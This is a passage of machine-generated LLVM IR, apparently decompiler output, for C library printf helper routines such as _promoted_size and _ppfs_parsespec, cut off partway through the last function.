  store i32 %v1_805232e, i32* %ebx.global-to-local, align 4
  %v1_8052331 = add i32 %arg1, 24
  %v2_8052331 = inttoptr i32 %v1_8052331 to i32*
  %v3_8052331 = load i32, i32* %v2_8052331, align 4
  %v4_8052331 = icmp eq i32 %v3_8052331, 0
  %v1_8052335 = icmp eq i1 %v4_8052331, false
  %v1_80523eb = add i32 %arg1, 8
  %v2_80523eb = inttoptr i32 %v1_80523eb to i32*
  %v3_80523eb = load i32, i32* %v2_80523eb, align 4
  %v8_80523eb = icmp eq i32 %v3_80523eb, -2147483648
  %v1_80523f2 = icmp eq i1 %v8_80523eb, false
  br i1 %v1_8052335, label %dec_label_pc_80523eb, label %dec_label_pc_805233b

dec_label_pc_805233b:                             ; preds = %entry
  br i1 %v1_80523f2, label %dec_label_pc_8052355, label %dec_label_pc_8052344

dec_label_pc_8052344:                             ; preds = %dec_label_pc_805233b
  %v1_8052344 = add i32 %arg1, 76
  %v2_8052344 = inttoptr i32 %v1_8052344 to i32*
  %v3_8052344 = load i32, i32* %v2_8052344, align 4
  store i32 %v3_8052344, i32* %eax.global-to-local, align 4
  %v1_8052347 = add i32 %v3_8052344, 4
  store i32 %v1_8052347, i32* %edx.global-to-local, align 4
  store i32 %v1_8052347, i32* %v2_8052344, align 4
  %v0_805234d = load i32, i32* %eax.global-to-local, align 4
  %v1_805234d = inttoptr i32 %v0_805234d to i32*
  %v2_805234d = load i32, i32* %v1_805234d, align 4
  store i32 %v2_805234d, i32* %eax.global-to-local, align 4
  %v1_805234f = load i32, i32* @ecx, align 4
  %v2_805234f = add i32 %v1_805234f, 80
  %v3_805234f = inttoptr i32 %v2_805234f to i32*
  store i32 %v2_805234d, i32* %v3_805234f, align 4
  %v0_8052352 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052352 = load i32, i32* @ecx, align 4
  %v2_8052352 = add i32 %v1_8052352, 8
  %v3_8052352 = inttoptr i32 %v2_8052352 to i32*
  store i32 %v0_8052352, i32* %v3_8052352, align 4
  %v0_8052355.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052355

dec_label_pc_8052355:                             ; preds = %dec_label_pc_805233b, %dec_label_pc_8052344
  %v1_8052364 = phi i32 [ %arg1, %dec_label_pc_805233b ], [ %v0_8052355.pre, %dec_label_pc_8052344 ]
  %v1_8052355 = add i32 %v1_8052364, 4
  %v2_8052355 = inttoptr i32 %v1_8052355 to i32*
  %v3_8052355 = load i32, i32* %v2_8052355, align 4
  %v8_8052355 = icmp eq i32 %v3_8052355, -2147483648
  %v1_805235c = icmp eq i1 %v8_8052355, false
  br i1 %v1_805235c, label %dec_label_pc_805236f, label %dec_label_pc_805235e

dec_label_pc_805235e:                             ; preds = %dec_label_pc_8052355
  %v1_805235e = add i32 %v1_8052364, 76
  %v2_805235e = inttoptr i32 %v1_805235e to i32*
  %v3_805235e = load i32, i32* %v2_805235e, align 4
  store i32 %v3_805235e, i32* %eax.global-to-local, align 4
  %v1_8052361 = add i32 %v3_805235e, 4
  store i32 %v1_8052361, i32* %edx.global-to-local, align 4
  store i32 %v1_8052361, i32* %v2_805235e, align 4
  %v0_8052367 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052367 = inttoptr i32 %v0_8052367 to i32*
  %v2_8052367 = load i32, i32* %v1_8052367, align 4
  store i32 %v2_8052367, i32* %eax.global-to-local, align 4
  %v1_8052369 = load i32, i32* @ecx, align 4
  %v2_8052369 = add i32 %v1_8052369, 80
  %v3_8052369 = inttoptr i32 %v2_8052369 to i32*
  store i32 %v2_8052367, i32* %v3_8052369, align 4
  %v0_805236c = load i32, i32* %eax.global-to-local, align 4
  %v1_805236c = load i32, i32* @ecx, align 4
  %v2_805236c = add i32 %v1_805236c, 4
  %v3_805236c = inttoptr i32 %v2_805236c to i32*
  store i32 %v0_805236c, i32* %v3_805236c, align 4
  %v1_80523e417.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805236f

dec_label_pc_805236f:                             ; preds = %dec_label_pc_8052355, %dec_label_pc_805235e
  %v1_80523e417 = phi i32 [ %v1_8052364, %dec_label_pc_8052355 ], [ %v1_80523e417.pre, %dec_label_pc_805235e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80523e418 = add i32 %v1_80523e417, 28
  %v3_80523e419 = inttoptr i32 %v2_80523e418 to i32*
  %v4_80523e420 = load i32, i32* %v3_80523e419, align 4
  %v5_80523e721 = icmp sgt i32 %v4_80523e420, 0
  br i1 %v5_80523e721, label %dec_label_pc_8052373, label %dec_label_pc_8052419.loopexit

dec_label_pc_8052373:                             ; preds = %dec_label_pc_805236f, %dec_label_pc_80523e3
  %v1_80523e423 = phi i32 [ %v1_80523e4, %dec_label_pc_80523e3 ], [ %v1_80523e417, %dec_label_pc_805236f ]
  %v1_805237322 = phi i32 [ %v1_80523e3, %dec_label_pc_80523e3 ], [ 0, %dec_label_pc_805236f ]
  %v2_8052373 = mul i32 %v1_805237322, 4
  %v3_8052373 = add i32 %v2_8052373, 40
  %v4_8052373 = add i32 %v3_8052373, %v1_80523e423
  %v5_8052373 = inttoptr i32 %v4_8052373 to i32*
  %v6_8052373 = load i32, i32* %v5_8052373, align 4
  store i32 %v6_8052373, i32* %eax.global-to-local, align 4
  %v1_8052377 = add i32 %v6_8052373, -8
  %v9_8052377 = icmp eq i32 %v1_8052377, 0
  br i1 %v9_8052377, label %dec_label_pc_80523e3, label %dec_label_pc_805237c

dec_label_pc_805237c:                             ; preds = %dec_label_pc_8052373
  %v10_8052377 = icmp slt i32 %v1_8052377, 0
  %v6_8052377 = sub i32 7, %v6_8052373
  %v7_8052377 = and i32 %v6_8052377, %v6_8052373
  %v8_8052377 = icmp slt i32 %v7_8052377, 0
  %v1_805237c = add i32 %v1_80523e423, 76
  %v2_805237c = inttoptr i32 %v1_805237c to i32*
  %v3_805237c = load i32, i32* %v2_805237c, align 4
  store i32 %v3_805237c, i32* %edx.global-to-local, align 4
  %v3_805237f = icmp eq i1 %v10_8052377, %v8_8052377
  br i1 %v3_805237f, label %dec_label_pc_805238f, label %dec_label_pc_8052381

dec_label_pc_8052381:                             ; preds = %dec_label_pc_805237c
  %tmp15 = icmp slt i32 %v6_8052373, 3
  %v9_8052388 = icmp eq i32 %v6_8052373, 7
  %v1_805238b = icmp eq i1 %v9_8052388, false
  %or.cond = or i1 %tmp15, %v1_805238b
  br i1 %or.cond, label %dec_label_pc_80523d6, label %dec_label_pc_80523b8

dec_label_pc_805238f:                             ; preds = %dec_label_pc_805237c
  %tmp16 = icmp sgt i32 %v6_8052373, 1024
  br i1 %tmp16, label %dec_label_pc_8052398, label %dec_label_pc_80523d6

dec_label_pc_8052398:                             ; preds = %dec_label_pc_805238f
  %v6_8052398 = icmp eq i32 %v6_8052373, 2048
  br i1 %v6_8052398, label %dec_label_pc_80523a8, label %dec_label_pc_805239f

dec_label_pc_805239f:                             ; preds = %dec_label_pc_8052398
  %v9_805239f = icmp eq i32 %v6_8052373, 2055
  %v1_80523a4 = icmp eq i1 %v9_805239f, false
  br i1 %v1_80523a4, label %dec_label_pc_80523d6, label %dec_label_pc_80523c7

dec_label_pc_80523a8:                             ; preds = %dec_label_pc_8052398
  %v1_80523a8 = add i32 %v3_805237c, 8
  store i32 %v1_80523a8, i32* %eax.global-to-local, align 4
  store i32 %v1_80523a8, i32* %v2_805237c, align 4
  %v0_80523ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80523ae = inttoptr i32 %v0_80523ae to i32*
  %v2_80523ae = load i32, i32* %v1_80523ae, align 4
  store i32 %v2_80523ae, i32* %eax.global-to-local, align 4
  %v1_80523b0 = add i32 %v0_80523ae, 4
  %v2_80523b0 = inttoptr i32 %v1_80523b0 to i32*
  %v3_80523b0 = load i32, i32* %v2_80523b0, align 4
  store i32 %v3_80523b0, i32* %edx.global-to-local, align 4
  %v1_80523b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523b3 = add i32 %v1_80523b3, 4
  %v3_80523b3 = inttoptr i32 %v2_80523b3 to i32*
  store i32 %v3_80523b0, i32* %v3_80523b3, align 4
  %v0_80523de.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523b8:                             ; preds = %dec_label_pc_8052381
  %v3_80523b8 = load i32, i32* %v2_805237c, align 4
  store i32 %v3_80523b8, i32* %edx.global-to-local, align 4
  %v1_80523bb = add i32 %v3_80523b8, 8
  store i32 %v1_80523bb, i32* %eax.global-to-local, align 4
  store i32 %v1_80523bb, i32* %v2_805237c, align 4
  %v0_80523c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523c1 = inttoptr i32 %v0_80523c1 to double*
  %v2_80523c1 = load double, double* %v1_80523c1, align 4
  %v2_80523c3 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80523c3 = inttoptr i32 %v2_80523c3 to double*
  store double %v2_80523c1, double* %v4_80523c3, align 4
  br label %dec_label_pc_80523e0

dec_label_pc_80523c7:                             ; preds = %dec_label_pc_805239f
  %v3_80523c7 = load i32, i32* %v2_805237c, align 4
  store i32 %v3_80523c7, i32* %edx.global-to-local, align 4
  %v1_80523ca = add i32 %v3_80523c7, 12
  store i32 %v1_80523ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80523ca, i32* %v2_805237c, align 4
  %v0_80523d0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523d0 = inttoptr i32 %v0_80523d0 to x86_fp80*
  %v2_80523d0 = load x86_fp80, x86_fp80* %v1_80523d0, align 4
  %v2_80523d2 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80523d2 = inttoptr i32 %v2_80523d2 to x86_fp80*
  store x86_fp80 %v2_80523d0, x86_fp80* %v3_80523d2, align 4
  br label %dec_label_pc_80523e0

dec_label_pc_80523d6:                             ; preds = %dec_label_pc_8052381, %dec_label_pc_805238f, %dec_label_pc_805239f
  %v1_80523d6 = add i32 %v3_805237c, 4
  store i32 %v1_80523d6, i32* %eax.global-to-local, align 4
  store i32 %v1_80523d6, i32* %v2_805237c, align 4
  %v0_80523dc = load i32, i32* %edx.global-to-local, align 4
  %v1_80523dc = inttoptr i32 %v0_80523dc to i32*
  %v2_80523dc = load i32, i32* %v1_80523dc, align 4
  store i32 %v2_80523dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523de:                             ; preds = %dec_label_pc_80523a8, %dec_label_pc_80523d6
  %v0_80523de = phi i32 [ %v0_80523de.pre, %dec_label_pc_80523a8 ], [ %v2_80523dc, %dec_label_pc_80523d6 ]
  %v1_80523de = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523de = inttoptr i32 %v1_80523de to i32*
  store i32 %v0_80523de, i32* %v2_80523de, align 4
  %v0_80523e0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523e0

dec_label_pc_80523e0:                             ; preds = %dec_label_pc_80523c7, %dec_label_pc_80523b8, %dec_label_pc_80523de
  %v0_80523e0 = phi i32 [ %v2_80523d2, %dec_label_pc_80523c7 ], [ %v2_80523c3, %dec_label_pc_80523b8 ], [ %v0_80523e0.pre, %dec_label_pc_80523de ]
  %v1_80523e0 = add i32 %v0_80523e0, 12
  store i32 %v1_80523e0, i32* %ebx.global-to-local, align 4
  %v0_80523e3.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80523e4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80523e3

dec_label_pc_80523e3:                             ; preds = %dec_label_pc_8052373, %dec_label_pc_80523e0
  %v1_80523e4 = phi i32 [ %v1_80523e423, %dec_label_pc_8052373 ], [ %v1_80523e4.pre, %dec_label_pc_80523e0 ]
  %v0_80523e3 = phi i32 [ %v1_805237322, %dec_label_pc_8052373 ], [ %v0_80523e3.pre, %dec_label_pc_80523e0 ]
  %v1_80523e3 = add i32 %v0_80523e3, 1
  store i32 %v1_80523e3, i32* %esi.global-to-local, align 4
  %v2_80523e4 = add i32 %v1_80523e4, 28
  %v3_80523e4 = inttoptr i32 %v2_80523e4 to i32*
  %v4_80523e4 = load i32, i32* %v3_80523e4, align 4
  %v5_80523e7 = icmp slt i32 %v1_80523e3, %v4_80523e4
  br i1 %v5_80523e7, label %dec_label_pc_8052373, label %dec_label_pc_8052419.loopexit

dec_label_pc_80523eb:                             ; preds = %entry
  br i1 %v1_80523f2, label %dec_label_pc_8052402, label %dec_label_pc_80523f4

dec_label_pc_80523f4:                             ; preds = %dec_label_pc_80523eb
  %v1_80523f4 = add i32 %arg1, 36
  %v2_80523f4 = inttoptr i32 %v1_80523f4 to i8*
  %v3_80523f4 = load i8, i8* %v2_80523f4, align 1
  %v2_80523f8 = zext i8 %v3_80523f4 to i32
  %v3_80523f8 = mul nuw nsw i32 %v2_80523f8, 12
  store i32 %v3_80523f8, i32* %eax.global-to-local, align 4
  %v2_80523fb = add i32 %arg1, 68
  %v3_80523fb = add i32 %v2_80523fb, %v3_80523f8
  %v4_80523fb = inttoptr i32 %v3_80523fb to i32*
  %v5_80523fb = load i32, i32* %v4_80523fb, align 4
  store i32 %v5_80523fb, i32* %eax.global-to-local, align 4
  store i32 %v5_80523fb, i32* %v2_80523eb, align 4
  %v0_8052402.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052402

dec_label_pc_8052402:                             ; preds = %dec_label_pc_80523eb, %dec_label_pc_80523f4
  %v1_8052416 = phi i32 [ %arg1, %dec_label_pc_80523eb ], [ %v0_8052402.pre, %dec_label_pc_80523f4 ]
  %v1_8052402 = add i32 %v1_8052416, 4
  %v2_8052402 = inttoptr i32 %v1_8052402 to i32*
  %v3_8052402 = load i32, i32* %v2_8052402, align 4
  %v8_8052402 = icmp eq i32 %v3_8052402, -2147483648
  %v1_8052409 = icmp eq i1 %v8_8052402, false
  br i1 %v1_8052409, label %dec_label_pc_8052419, label %dec_label_pc_805240b

dec_label_pc_805240b:                             ; preds = %dec_label_pc_8052402
  %v1_805240b = add i32 %v1_8052416, 37
  %v2_805240b = inttoptr i32 %v1_805240b to i8*
  %v3_805240b = load i8, i8* %v2_805240b, align 1
  %v2_805240f = zext i8 %v3_805240b to i32
  %v3_805240f = mul nuw nsw i32 %v2_805240f, 12
  store i32 %v3_805240f, i32* %eax.global-to-local, align 4
  %v1_8052412 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052412 = add nsw i32 %v3_805240f, -12
  %v3_8052412 = add i32 %v2_8052412, %v1_8052412
  %v4_8052412 = inttoptr i32 %v3_8052412 to i32*
  %v5_8052412 = load i32, i32* %v4_8052412, align 4
  store i32 %v5_8052412, i32* %eax.global-to-local, align 4
  store i32 %v5_8052412, i32* %v2_8052402, align 4
  %v0_8052419.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052419

dec_label_pc_8052419.loopexit:                    ; preds = %dec_label_pc_80523e3, %dec_label_pc_805236f
  %v1_80523e4.lcssa = phi i32 [ %v1_80523e417, %dec_label_pc_805236f ], [ %v1_80523e4, %dec_label_pc_80523e3 ]
  br label %dec_label_pc_8052419

dec_label_pc_8052419:                             ; preds = %dec_label_pc_8052419.loopexit, %dec_label_pc_8052402, %dec_label_pc_805240b
  %v10_8052420 = phi i32 [ %v1_80523e4.lcssa, %dec_label_pc_8052419.loopexit ], [ %v1_8052416, %dec_label_pc_8052402 ], [ %v0_8052419.pre, %dec_label_pc_805240b ]
  %v1_8052419 = add i32 %v10_8052420, 8
  %v2_8052419 = inttoptr i32 %v1_8052419 to i32*
  %v3_8052419 = load i32, i32* %v2_8052419, align 4
  store i32 %v3_8052419, i32* %eax.global-to-local, align 4
  %v2_805241c = icmp slt i32 %v3_8052419, 0
  %v1_805241e = icmp eq i1 %v2_805241c, false
  br i1 %v1_805241e, label %dec_label_pc_8052434, label %dec_label_pc_8052420

dec_label_pc_8052420:                             ; preds = %dec_label_pc_8052419
  %v1_8052420 = add i32 %v10_8052420, 16
  %v2_8052420 = inttoptr i32 %v1_8052420 to i32*
  %v3_8052420 = load i32, i32* %v2_8052420, align 4
  %v4_8052420 = or i32 %v3_8052420, 8
  store i32 %v4_8052420, i32* %v2_8052420, align 4
  %v0_8052424 = load i32, i32* @ecx, align 4
  %v1_8052424 = add i32 %v0_8052424, 16
  %v2_8052424 = inttoptr i32 %v1_8052424 to i32*
  %v3_8052424 = load i32, i32* %v2_8052424, align 4
  %v4_8052424 = and i32 %v3_8052424, -2
  store i32 %v4_8052424, i32* %v2_8052424, align 4
  %v0_8052428 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052428 = sub i32 0, %v0_8052428
  store i32 %v1_8052428, i32* %eax.global-to-local, align 4
  %v1_805242a = load i32, i32* @ecx, align 4
  %v2_805242a = add i32 %v1_805242a, 8
  %v3_805242a = inttoptr i32 %v2_805242a to i32*
  store i32 %v1_8052428, i32* %v3_805242a, align 4
  %v0_805242d = load i32, i32* @ecx, align 4
  %v1_805242d = add i32 %v0_805242d, 20
  %v2_805242d = inttoptr i32 %v1_805242d to i32*
  store i32 32, i32* %v2_805242d, align 4
  %v0_8052436.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052434

dec_label_pc_8052434:                             ; preds = %dec_label_pc_8052419, %dec_label_pc_8052420
  %v0_8052436 = phi i32 [ %v3_8052419, %dec_label_pc_8052419 ], [ %v0_8052436.pre, %dec_label_pc_8052420 ]
  %v2_8052434 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052434, i32* @ebx, align 4
  ret i32 %v0_8052436

; uselistorder directives
  uselistorder i32 %v3_805240f, { 1, 0 }
  uselistorder i32 %v3_80523f8, { 1, 0 }
  uselistorder i32 %v1_80523e3, { 2, 1, 0 }
  uselistorder i32 %v1_80523e4, { 0, 2, 1 }
  uselistorder i32 %v3_805237c, { 1, 0, 2 }
  uselistorder i32* %v2_805237c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8052377, { 1, 0 }
  uselistorder i32 %v6_8052373, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805237322, { 1, 0 }
  uselistorder i1 %v1_80523f2, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8052434, { 1, 0 }
  uselistorder label %dec_label_pc_8052419, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052402, { 1, 0 }
  uselistorder label %dec_label_pc_80523e3, { 1, 0 }
  uselistorder label %dec_label_pc_80523e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523de, { 1, 0 }
  uselistorder label %dec_label_pc_80523d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052373, { 1, 0 }
  uselistorder label %dec_label_pc_805236f, { 1, 0 }
  uselistorder label %dec_label_pc_8052355, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052438 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805243f

dec_label_pc_805243f:                             ; preds = %dec_label_pc_805243f, %entry
  %v0_805243f = phi i32 [ ptrtoint (i8** @global_var_805b64a.493 to i32), %entry ], [ %v1_805243f, %dec_label_pc_805243f ]
  %v1_805243f = add i32 %v0_805243f, -2
  %v1_8052442 = inttoptr i32 %v1_805243f to i16*
  %v2_8052442 = load i16, i16* %v1_8052442, align 2
  %v3_8052442 = sext i16 %v2_8052442 to i32
  %v12_8052445 = icmp ne i32 %v3_8052442, %v0_8052438
  %v6_805244f = icmp ugt i32 %v1_805243f, ptrtoint (i32* @global_var_805b632.494 to i32)
  %or.cond = and i1 %v6_805244f, %v12_8052445
  br i1 %or.cond, label %dec_label_pc_805243f, label %dec_label_pc_8052451

dec_label_pc_8052451:                             ; preds = %dec_label_pc_805243f
  %.pre = add i32 %v0_805243f, -134592052
  %v2_8052457 = sdiv i32 %.pre, 2
  store i32 %v2_8052457, i32* @edx, align 4
  %v1_8052459 = add i32 %v2_8052457, ptrtoint (i8** @global_var_805b64a.493 to i32)
  %v2_8052459 = inttoptr i32 %v1_8052459 to i8*
  %v3_8052459 = load i8, i8* %v2_8052459, align 1
  %v4_8052459 = zext i8 %v3_8052459 to i32
  ret i32 %v4_8052459

; uselistorder directives
  uselistorder i32 %v2_8052457, { 1, 0 }
  uselistorder i32 %v1_805243f, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805b64a.493 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052462 = load i32, i32* @edi, align 4
  %v0_8052463 = load i32, i32* @esi, align 4
  %v0_8052464 = load i32, i32* @ebx, align 4
  store i32 %v0_8052464, i32* %stack_var_-16, align 4
  %v4_8052464 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8052490 = add i32 %tmp76, 24
  %v2_8052490 = inttoptr i32 %v1_8052490 to i32*
  %v3_8052490 = load i32, i32* %v2_8052490, align 4
  store i32 %v3_8052490, i32* %eax.global-to-local, align 4
  %v1_8052497 = add i32 %tmp76, 16
  %v2_8052497 = inttoptr i32 %v1_8052497 to i32*
  %v3_8052497 = load i32, i32* %v2_8052497, align 4
  %v1_805249a = and i32 %v3_8052497, 128
  %v2_805249a = icmp eq i32 %v1_805249a, 0
  store i32 %v1_805249a, i32* %edi.global-to-local, align 4
  %v1_80524a0 = icmp eq i1 %v2_805249a, false
  br i1 %v1_80524a0, label %dec_label_pc_80524b3, label %dec_label_pc_80524a2

dec_label_pc_80524a2:                             ; preds = %entry
  %v2_80524a2 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8052500.outer

dec_label_pc_80524ad:                             ; preds = %dec_label_pc_805263b
  %v1_80524ad = add i32 %v0_805263b.pre.pre, 1
  store i32 %v1_80524ad, i32* @esi, align 4
  br label %dec_label_pc_805264b

dec_label_pc_80524b3:                             ; preds = %entry
  %v15_8052465 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524b5

dec_label_pc_80524b5:                             ; preds = %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge, %dec_label_pc_80524b3
  %v2_80524c6 = phi i32 [ %v2_80524c6.pre, %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge ], [ %v15_8052465, %dec_label_pc_80524b3 ]
  %v3_80524c6 = phi i32 [ %v1_80524dd, %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge ], [ 0, %dec_label_pc_80524b3 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80524b9 = mul i32 %v3_80524c6, 4
  store i32 %v1_80524b9, i32* @ecx, align 4
  %v2_80524c0 = load i32, i32* %arg1, align 4
  store i32 %v2_80524c0, i32* @edx, align 4
  %v2_80524c2 = add i32 %v1_80524b9, -4
  %v3_80524c2 = add i32 %v2_80524c2, %v2_80524c0
  %v4_80524c2 = inttoptr i32 %v3_80524c2 to i32*
  %v5_80524c2 = load i32, i32* %v4_80524c2, align 4
  store i32 %v5_80524c2, i32* %eax.global-to-local, align 4
  %v1_80524c6 = trunc i32 %v5_80524c2 to i8
  %v4_80524c6 = add i32 %v2_80524c6, 36
  %v5_80524c6 = add i32 %v4_80524c6, %v3_80524c6
  %v6_80524c6 = inttoptr i32 %v5_80524c6 to i8*
  store i8 %v1_80524c6, i8* %v6_80524c6, align 1
  %v0_80524ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80524ca = urem i32 %v0_80524ca, 256
  %v2_80524ca = load i32, i32* @ebx, align 4
  %v3_80524ca = and i32 %v2_80524ca, -256
  %v4_80524ca = or i32 %v3_80524ca, %v1_80524ca
  store i32 %v4_80524ca, i32* @ebx, align 4
  %v1_80524cc = mul i32 %v0_80524ca, 16777216
  %v2_80524cc = sdiv i32 %v1_80524cc, 16777216
  store i32 %v2_80524cc, i32* %eax.global-to-local, align 4
  %v1_80524cf = load i32, i32* @edx, align 4
  %v2_80524cf = load i32, i32* @ecx, align 4
  %v3_80524cf = add i32 %v1_80524cf, -4
  %v4_80524cf = add i32 %v3_80524cf, %v2_80524cf
  %v5_80524cf = inttoptr i32 %v4_80524cf to i32*
  %v6_80524cf = load i32, i32* %v5_80524cf, align 4
  %v17_80524cf = icmp eq i32 %v2_80524cc, %v6_80524cf
  %v1_80524d3 = icmp eq i1 %v17_80524cf, false
  br i1 %v1_80524d3, label %dec_label_pc_805281c, label %dec_label_pc_80524d9

dec_label_pc_80524d9:                             ; preds = %dec_label_pc_80524b5
  %v3_80524d9 = trunc i32 %v0_80524ca to i8
  %v4_80524d9 = icmp eq i8 %v3_80524d9, 0
  br i1 %v4_80524d9, label %dec_label_pc_80524e3, label %dec_label_pc_80524dd

dec_label_pc_80524dd:                             ; preds = %dec_label_pc_80524d9
  %v0_80524dd = load i32, i32* %esi.global-to-local, align 4
  %v1_80524dd = add i32 %v0_80524dd, 1
  store i32 %v1_80524dd, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_80524dd, 32
  br i1 %tmp175, label %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge, label %dec_label_pc_80524e3

dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge: ; preds = %dec_label_pc_80524dd
  %v2_80524c6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80524b5

dec_label_pc_80524e3:                             ; preds = %dec_label_pc_80524dd, %dec_label_pc_80524d9
  %v2_80524e8 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8052500.outer

dec_label_pc_8052500.outer:                       ; preds = %dec_label_pc_80524e3, %dec_label_pc_80524a2, %dec_label_pc_805261d
  %v0_805250c.ph94 = phi i32 [ %v1_805261d, %dec_label_pc_805261d ], [ %v2_80524a2, %dec_label_pc_80524a2 ], [ %v2_80524e8, %dec_label_pc_80524e3 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805261d ], [ %tmp66, %dec_label_pc_80524a2 ], [ %tmp66, %dec_label_pc_80524e3 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_80524a6, %dec_label_pc_805261d ], [ 0, %dec_label_pc_80524a2 ], [ 0, %dec_label_pc_80524e3 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805261d ], [ %v3_8052490, %dec_label_pc_80524a2 ], [ %v3_8052490, %dec_label_pc_80524e3 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805261d ], [ 0, %dec_label_pc_80524a2 ], [ 0, %dec_label_pc_80524e3 ]
  %v7_8052507 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8052507 = trunc i64 %v7_8052507 to i32
  %v2_805250f = add i32 %v8_8052507, 80
  br label %dec_label_pc_8052500

dec_label_pc_8052500:                             ; preds = %dec_label_pc_8052500.outer, %dec_label_pc_80525bd
  %v0_805250c = phi i32 [ %v0_80525ca, %dec_label_pc_80525bd ], [ %v0_805250c.ph94, %dec_label_pc_8052500.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_80525bd ], [ %stack_var_-32.1.ph, %dec_label_pc_8052500.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_80525bd ], [ %stack_var_-88.1.ph, %dec_label_pc_8052500.outer ]
  store i32 %v0_805250c, i32* @edx, align 4
  store i32 %v0_805250c, i32* @esi, align 4
  %v1_8052502 = inttoptr i32 %v0_805250c to i8*
  %v2_8052502 = load i8, i8* %v1_8052502, align 1
  %v11_8052502 = icmp eq i8 %v2_8052502, 42
  %v1_8052505 = icmp eq i1 %v11_8052502, false
  br i1 %v1_8052505, label %dec_label_pc_8052517, label %dec_label_pc_8052507

dec_label_pc_8052507:                             ; preds = %dec_label_pc_8052500
  store i32 %v8_8052507, i32* %eax.global-to-local, align 4
  %v1_805250c = add i32 %v0_805250c, 1
  store i32 %v1_805250c, i32* @esi, align 4
  %v0_805250f = load i32, i32* @esp, align 4
  %v3_805250f = add i32 %v2_805250f, %v0_805250f
  %v4_805250f = inttoptr i32 %v3_805250f to i32*
  store i32 0, i32* %v4_805250f, align 4
  %v0_8052531.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052517

dec_label_pc_8052517:                             ; preds = %dec_label_pc_8052500, %dec_label_pc_8052507
  %v0_8052531.pre = phi i32 [ %v0_805250c, %dec_label_pc_8052500 ], [ %v0_8052531.pre.pre, %dec_label_pc_8052507 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8052519 = load i32, i32* @global_var_805d1e8, align 8
  store i32 %v0_8052519, i32* %ebp.global-to-local, align 4
  %v4_8052531.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052531124 = inttoptr i32 %v0_8052531.pre to i8*
  %v2_8052531125 = load i8, i8* %v1_8052531124, align 1
